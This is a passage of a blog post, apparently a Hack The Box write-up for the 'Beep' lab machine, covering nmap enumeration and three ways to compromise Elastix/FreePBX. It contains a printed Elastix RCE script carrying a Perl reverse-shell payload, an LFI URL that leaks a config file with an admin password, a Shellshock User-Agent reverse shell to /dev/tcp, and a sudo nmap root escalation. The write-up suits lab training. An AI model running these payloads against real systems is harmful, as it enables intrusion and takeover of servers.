</span></span><span class=line><span class=cl><span class=p>|</span>_imap-capabilities: CATENATE LITERAL+ <span class=nv>SORT</span><span class=o>=</span>MODSEQ URLAUTHA0001 MAILBOX-REFERRALS CONDSTORE UIDPLUS ATOMIC IDLE LISTEXT MULTIAPPEND IMAP4rev1 CHILDREN X-NETSCAPE Completed ANNOTATEMORE ACL <span class=nv>THREAD</span><span class=o>=</span>REFERENCES STARTTLS <span class=nv>THREAD</span><span class=o>=</span>ORDEREDSUBJECT OK NAMESPACE QUOTA SORT BINARY LIST-SUBSCRIBED IMAP4 <span class=nv>RIGHTS</span><span class=o>=</span>kxte UNSELECT NO ID RENAME
</span></span><span class=line><span class=cl>443/tcp   open  ssl/http   syn-ack ttl <span class=m>63</span> Apache httpd 2.2.3 <span class=o>((</span>CentOS<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Elastix - Login page
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>1</span> disallowed entry
</span></span><span class=line><span class=cl><span class=p>|</span>_/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2023-07-04T11:40:21+00:00<span class=p>;</span> 0s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>localhost.localdomain/organizationName<span class=o>=</span>SomeOrganization/stateOrProvinceName<span class=o>=</span>SomeState/countryName<span class=o>=</span>--/localityName<span class=o>=</span>SomeCity/organizationalUnitName<span class=o>=</span>SomeOrganizationalUnit/emailAddress<span class=o>=</span>root@localhost.localdomain
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>localhost.localdomain/organizationName<span class=o>=</span>SomeOrganization/stateOrProvinceName<span class=o>=</span>SomeState/countryName<span class=o>=</span>--/localityName<span class=o>=</span>SomeCity/organizationalUnitName<span class=o>=</span>SomeOrganizationalUnit/emailAddress<span class=o>=</span>root@localhost.localdomain
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>1024</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2017-04-07T08:22:08
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2018-04-07T08:22:08
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8
</span></span><span class=line><span class=cl><span class=p>|</span> SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f
</span></span><span class=line><span class=cl><span class=p>|</span> -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span> MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
</span></span><span class=line><span class=cl><span class=p>|</span> MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK
</span></span><span class=line><span class=cl><span class=p>|</span> ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV
</span></span><span class=line><span class=cl><span class=p>|</span> bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
</span></span><span class=line><span class=cl><span class=p>|</span> CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX
</span></span><span class=line><span class=cl><span class=p>|</span> DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
</span></span><span class=line><span class=cl><span class=p>|</span> dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
</span></span><span class=line><span class=cl><span class=p>|</span> MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
</span></span><span class=line><span class=cl><span class=p>|</span> bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
</span></span><span class=line><span class=cl><span class=p>|</span> LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN
</span></span><span class=line><span class=cl><span class=p>|</span> gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a
</span></span><span class=line><span class=cl><span class=p>|</span> oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp
</span></span><span class=line><span class=cl><span class=p>|</span> Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE
</span></span><span class=line><span class=cl><span class=p>|</span> FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G
</span></span><span class=line><span class=cl><span class=p>|</span> k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0
</span></span><span class=line><span class=cl><span class=p>|</span> YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv
</span></span><span class=line><span class=cl><span class=p>|</span> bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j
</span></span><span class=line><span class=cl><span class=p>|</span> YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z
</span></span><span class=line><span class=cl><span class=p>|</span> dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
</span></span><span class=line><span class=cl><span class=p>|</span> gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9
</span></span><span class=line><span class=cl><span class=p>|</span> l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV
</span></span><span class=line><span class=cl><span class=p>|</span> 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw<span class=o>==</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>878/tcp   open  status     syn-ack ttl <span class=m>63</span> <span class=m>1</span> <span class=o>(</span>RPC <span class=c1>#100024)</span>
</span></span><span class=line><span class=cl>993/tcp   open  ssl/imap   syn-ack ttl <span class=m>63</span> Cyrus imapd
</span></span><span class=line><span class=cl><span class=p>|</span>_imap-capabilities: CAPABILITY
</span></span><span class=line><span class=cl>995/tcp   open  pop3       syn-ack ttl <span class=m>63</span> Cyrus pop3d
</span></span><span class=line><span class=cl>3306/tcp  open  mysql      syn-ack ttl <span class=m>63</span> MySQL <span class=o>(</span>unauthorized<span class=o>)</span>
</span></span><span class=line><span class=cl>4190/tcp  open  sieve      syn-ack ttl <span class=m>63</span> Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 <span class=o>(</span>included w/cyrus imap<span class=o>)</span>
</span></span><span class=line><span class=cl>4445/tcp  open  upnotifyp? syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>4559/tcp  open  hylafax    syn-ack ttl <span class=m>63</span> HylaFAX 4.3.10
</span></span><span class=line><span class=cl>5038/tcp  open  asterisk   syn-ack ttl <span class=m>63</span> Asterisk Call Manager 1.1
</span></span><span class=line><span class=cl>10000/tcp open  http       syn-ack ttl <span class=m>63</span> MiniServ 1.570 <span class=o>(</span>Webmin httpd<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>Charset</span><span class=o>=</span>iso-8859-1<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
</span></span><span class=line><span class=cl>Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost<span class=p>;</span> OS: Unix
</span></span></code></pre></div><p>We have a bunch of ports in this machine let‚Äôs see what we are handling:</p><p>First we have <strong>the port 22</strong> for ssh service, maybe interesting with a valid credentials</p><p><strong>The ports 80, 443 and 10000</strong> are running web services the first one redirects to the 443 port so we only have two web services. We can observe that the linux machine is a CentOS</p><p><strong>The ports 25, 110, 143</strong> are running mail services and the ports 993, 995 are mail services too but from a open source called Cyrus, his version is shown at <strong>the port 4190</strong> as <strong>Cyrus timsieved 2.3.7.</strong></p><p><strong>The port 4559</strong> is running a FAX service named <strong>HylaFAX 4.3.10</strong></p><p><strong>Asterix</strong> is open source Call Manager running at <strong>port 5038</strong></p><p>The only port that I don‚Äôt find any info it‚Äôs <strong>the port 4445</strong> which runs the <strong>upnotifyp?</strong> service.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>We have a lot of ways to start to enumerate but my favourite is to start with the web services.</p><p><img loading=lazy src=/HTB/beep-1.png alt=Untitled></p><p>The first one shows a Elastix login page,I tried the common and the default credentials and nothing seems to work.</p><p>Elastix is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality which fits well what the previous nmap scan.</p><p>Let‚Äôs do a quick fuzz to see what we have. I used the -k flag to avoid the ssl check.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u https://<span class=nv>$IP</span>/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -f -k -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.5
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     https://10.10.10.7/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.5
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Add Slash:               <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/10 13:50:09 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta/                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 283<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 288<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 288<span class=o>]</span>
</span></span><span class=line><span class=cl>/admin/               <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; config.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/cgi-bin/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 286<span class=o>]</span>
</span></span><span class=line><span class=cl>/cgi-bin//            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 287<span class=o>]</span>
</span></span><span class=line><span class=cl>/configs/             <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1282<span class=o>]</span>
</span></span><span class=line><span class=cl>/error/               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 284<span class=o>]</span>
</span></span><span class=line><span class=cl>/help/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 346<span class=o>]</span>
</span></span><span class=line><span class=cl>/icons/               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 31006<span class=o>]</span>
</span></span><span class=line><span class=cl>/images/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 29898<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php/           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1785<span class=o>]</span>
</span></span><span class=line><span class=cl>/lang/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4788<span class=o>]</span>
</span></span><span class=line><span class=cl>/libs/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7798<span class=o>]</span>
</span></span><span class=line><span class=cl>/mail/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2411<span class=o>]</span>
</span></span><span class=line><span class=cl>/mailman/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 286<span class=o>]</span>
</span></span><span class=line><span class=cl>/modules/             <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 13132<span class=o>]</span>
</span></span><span class=line><span class=cl>/panel/               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1065<span class=o>]</span>
</span></span><span class=line><span class=cl>/pipermail/           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 698<span class=o>]</span>
</span></span><span class=line><span class=cl>/static/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1276<span class=o>]</span>
</span></span><span class=line><span class=cl>/themes/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 3172<span class=o>]</span>
</span></span><span class=line><span class=cl>/var/                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1236<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/10 13:54:08 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>The directories leaks the FreePBX version which is 2.8.1.4.</p><p>If we search Elastix in searchsploit we have a lot of useful exploits.</p><p><img loading=lazy src=/HTB/beep-2.png alt=Untitled></p><p>The only that definitely doesn‚Äôt gonna work is the XSS exploit because is a client side vulnerability. The two exploits which are so interesting are the <strong>RCE</strong> one and the <strong>LFI</strong> one. The <strong>PHP injection</strong> is a good one but is using the same file as the LFI and I will still consider it in case of the LFI doesn‚Äôt work.The <strong>Blind SQL Injection</strong> is on the iridium_threed.php script that the server doesn‚Äôt seem to load.</p><p>Now let‚Äôs see the website located at port 10000.</p><p><img loading=lazy src=/HTB/beep-3.png alt=Untitled></p><p>We can see again a login webpage, I tried to log in again without success. We can see that the webpage is running webmin. I am going to search some exploits for it.</p><p><img loading=lazy src=/HTB/beep-4.png alt=Untitled></p><p>A lot of exploits mention cgi so maybe has a <em>Shellshock vulnerability</em> exploited previously in <a href=http://pwndside.github.io/posts/shocker-htb>Shocker</a> machine.</p><p>It‚Äôs important to mention that the two websites have a ssl security problem with the certificate and I only can access them with Chromium.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>So we have three possible ways to exploit the machine, maybe more but let‚Äôs focus on what we have.</p><h3 id=first-way>First Way<a hidden class=anchor aria-hidden=true href=#first-way>#</a></h3><p>The first one is the <strong>RCE</strong>, let‚Äôs download the python script and see what is inside.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>searchsploit -m <span class=s2>&#34;18650&#34;</span>
</span></span></code></pre></div><p>The script is a url encoded reverse shell that is sent to the remote machine</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>import urllib
</span></span><span class=line><span class=cl>import ssl
</span></span><span class=line><span class=cl><span class=nv>rhost</span><span class=o>=</span><span class=s2>&#34;10.10.10.7&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>lhost</span><span class=o>=</span><span class=s2>&#34;10.10.14.20&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>lport</span><span class=o>=</span><span class=m>4444</span>
</span></span><span class=line><span class=cl><span class=nv>extension</span><span class=o>=</span><span class=s2>&#34;1000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ssl._create_default_https_context <span class=o>=</span> ssl._create_unverified_context
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reverse shell payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>url</span> <span class=o>=</span> <span class=s1>&#39;https://&#39;</span>+str<span class=o>(</span>rhost<span class=o>)</span>+<span class=s1>&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;</span>+str<span class=o>(</span>extension<span class=o>)</span>+<span class=s1>&#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22&#39;</span>+str<span class=o>(</span>lhost<span class=o>)</span>+<span class=s1>&#39;%3a&#39;</span>+str<span class=o>(</span>lport<span class=o>)</span>+<span class=s1>&#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>urllib.urlopen<span class=o>(</span>url<span class=o>)</span>
</span></span></code></pre></div><p>If we change the values of rhost and lhost,lport we can run the exploit and what happen. As it a reverse shell we need to perform a netcat listener</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><p><img loading=lazy src=/HTB/beep-5.png alt=Untitled></p><p>A SSL error occurred at moment of execution, I tried to change the script without success. Let‚Äôs try to make a proxy listener with burp to allow to send the malicious request to us and later send it to the machine. That allows us to send the request without ssl and resend it with ssl thanks to the burp listener</p><p>First we are changing the rhost value to <a href=http://localhost>localhost</a> and the url from https to http.</p><p>Once we made this change, in BurpSuite with sudo privileges we need to go to <strong>Proxy > Options > Proxy Listeners > Add</strong> and in the Blinding page we put the port 80 and in the Request Handling we need to change the host to 10.10.10.7 and the port to 443 and check the SSL use.</p><p>With this done let‚Äôs put a the same nc listener and see if that works well.</p><p>Nothing seems to happen but looking at <strong>HTTP history</strong>, this time with the Burp Listener we can have more info of the error.</p><p><img loading=lazy src=/HTB/beep-6.png alt=Untitled></p><p>We can see that the problem is the PBX extension which seems is not a working one.</p><p>There is a utility called <strong>SIPVicious</strong> which is a open source VoIP security testing toolset which allow us to identify a working extension line on a PBX with their tool <em>svwar</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sipvicious_svwar -m INVITE -e100-500 <span class=nv>$IP</span>
</span></span></code></pre></div><p>-m : allow us to specify the method</p><p>-e : allow us to define a extension range</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>WARNING:TakeASip:using an INVITE scan on an endpoint <span class=o>(</span>i.e. SIP phone<span class=o>)</span> may cause it to ring and wake up people in the middle of the night
</span></span><span class=line><span class=cl>+-----------+----------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Extension <span class=p>|</span> Authentication <span class=p>|</span>
</span></span><span class=line><span class=cl>+<span class=o>===========</span>+<span class=o>================</span>+
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>233</span>       <span class=p>|</span> reqauth        <span class=p>|</span>
</span></span><span class=line><span class=cl>+-----------+----------------+
</span></span></code></pre></div><p>The results shows that the 233 is a valid extension for the attack.</p><p>Now let‚Äôs run all again with the changes.</p><p><img loading=lazy src=/HTB/beep-7.png alt=Untitled></p><p>First once we spawn a bash with <code>python -c 'import pty; pty.spawn("/bin/bash")</code> then lets keep the nc in background with ctrl^z, once done we use <code>stty raw -echo</code> and then <code>fg</code> to return to the web shell but fully interactive this time.</p><p>We have a shell now but without root privilege</p><p>Let‚Äôs cat the user flag</p><p><img loading=lazy src=/HTB/beep-8.png alt=Untitled></p><p>If we use sudo -l we can see that we have a lot of ways to be a root</p><p><img loading=lazy src=/HTB/beep-9.png alt=Untitled></p><p>I choose nmap one. We can find a payload in <a href=https://gtfobins.github.io/>GTFOBins</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap --interactive
</span></span><span class=line><span class=cl>nmap&gt; !sh
</span></span></code></pre></div><p>This one works for me, let‚Äôs cat the root‚Äôs flag</p><p><img loading=lazy src=/HTB/beep-10.png alt=Untitled></p><h3 id=second-way>Second Way<a hidden class=anchor aria-hidden=true href=#second-way>#</a></h3><p>Let‚Äôs move to the second way to own this machine, the LFI vulnerability.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>searchsploit -m <span class=s2>&#34;37637&#34;</span>
</span></span></code></pre></div><p>If we look at the exploit we can see that they use the url ‚Äúhttps://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action‚Äù to exploit the vuln. So let‚Äôs see what we can find in this page.</p><p><img loading=lazy src=/HTB/beep-11.png alt=Untitled></p><p>The page shows a file so we can deduce that there is a LFI vulnerability. There are a bunch of usernames and passwords, one of them caught my attention.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>ARI_ADMIN_USERNAME</span><span class=o>=</span>admin <span class=c1># This is the default admin password to allow an administrator to login to ARI bypassing all security.</span>
</span></span><span class=line><span class=cl><span class=nv>ARI_ADMIN_PASSWORD</span><span class=o>=</span>jEhdIekWmdjE <span class=c1># Change this to a secure password.</span>
</span></span></code></pre></div><p>I tried to log with ssh in the machine with <a href=mailto:admin@10.10.10.7>admin@10.10.10.7</a> and the password found but without success. My ssh key algorithms doesn‚Äôt match with the machine ones so I perform this command to be able to connect with ssh.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -o <span class=nv>KexAlgorithms</span><span class=o>=</span>+diffie-hellman-group-exchange-sha1 -o <span class=nv>HostKeyAlgorithms</span><span class=o>=</span>+ssh-dss admin@10.10.10.7
</span></span></code></pre></div><p>Let‚Äôs move to /etc/passwd directory to see what user are in the machine</p><p><img loading=lazy src=/HTB/beep-12.png alt=Untitled></p><p>Let‚Äôs try to log in ssh as root with the previous credentials.</p><p><img loading=lazy src=/HTB/beep-13.png alt=Untitled></p><p>We have gained access.</p><h3 id=third-way>Third Way<a hidden class=anchor aria-hidden=true href=#third-way>#</a></h3><p>Finally the last form to gain access, with the shellsock vulnerability.</p><p>We are going to exploit the main page.</p><p>The basis of this vuln is to edit the http request to modify the User-Agent header to ‚Äú() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.20/4444 0>&amp;1‚Äù we can do that with burp and allows us with a listening port to have a reverse shell.</p><p><img loading=lazy src=/HTB/beep-14.png alt=Untitled></p><p>This pictures shows so well how really works.</p><p>Let‚Äôs set the listener and send the request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><p><img loading=lazy src=/HTB/beep-15.png alt=Untitled></p><p><img loading=lazy src=/HTB/beep-16.png alt=Untitled></p><h2 id=lessons-learned>Lessons Learned<a hidden class=anchor aria-hidden=true href=#lessons-learned>#</a></h2><ul><li><p>What insights did you gain from the room?</p><p>How works a VoIP with PBX and how to exploit them as well as how to exploit a LFI vulnerability. The RCE and LFI can be avoided with a good URL sanitation.</p></li><li><p>Were there any novel tools or techniques employed?</p><p>The use of svwar which helps me to identify possible extensions for PBX.</p></li></ul><p><strong>Thank you for reading, and happy hacking! üòÑ</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/linux/>linux</a></li><li><a href=https://pwndside.github.io/tags/ssh/>ssh</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>